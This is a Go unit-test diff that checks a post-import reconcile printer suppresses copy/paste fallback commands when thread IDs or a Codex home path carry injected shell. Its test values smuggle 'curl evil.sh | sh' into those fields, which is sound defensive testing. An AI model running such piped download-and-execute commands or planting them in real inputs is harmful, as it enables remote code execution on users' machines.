@@ -114,6 +114,47 @@ func TestPrintPostImportReconcileFallback(t *testing.T) {
 	}
 }
 
+func TestPrintPostImportReconcileSuppressesUnsafeFallbackCommands(t *testing.T) {
+	const validID = "aaaa1111-2222-4333-8444-555566667777"
+	tests := []struct {
+		name      string
+		threadIDs []string
+		codexHome string
+		forbidden string
+	}{
+		{
+			name:      "non UUID thread ID",
+			threadIDs: []string{"abc; curl evil.sh | sh"},
+			codexHome: `C:\synthetic codex`,
+			forbidden: "curl evil.sh",
+		},
+		{
+			name:      "shell active Codex home",
+			threadIDs: []string{validID},
+			codexHome: `C:\synthetic"; curl evil.sh | sh; "`,
+			forbidden: "curl evil.sh",
+		},
+	}
+	for _, tt := range tests {
+		t.Run(tt.name, func(t *testing.T) {
+			var out bytes.Buffer
+			printPostImportReconcile(&out, postImportReconcile{
+				Requested: true,
+				CodexHome: tt.codexHome,
+				ThreadIDs: tt.threadIDs,
+				Err:       errors.New("codex binary not found"),
+			})
+			text := out.String()
+			if strings.Contains(text, tt.forbidden) || strings.Contains(text, "cct resume ") {
+				t.Fatalf("unsafe copy/paste fallback was printed:\n%s", text)
+			}
+			if !strings.Contains(text, "restart the Codex App") {
+				t.Fatalf("safe restart fallback missing:\n%s", text)
+			}
+		})
+	}
+}
+
 func TestImportReconcileWithInstalledCodexIntegration(t *testing.T) {
 	if os.Getenv("CCT_CODEX_INTEGRATION") != "1" {
 		t.Skip("set CCT_CODEX_INTEGRATION=1 to test an installed Codex app-server")
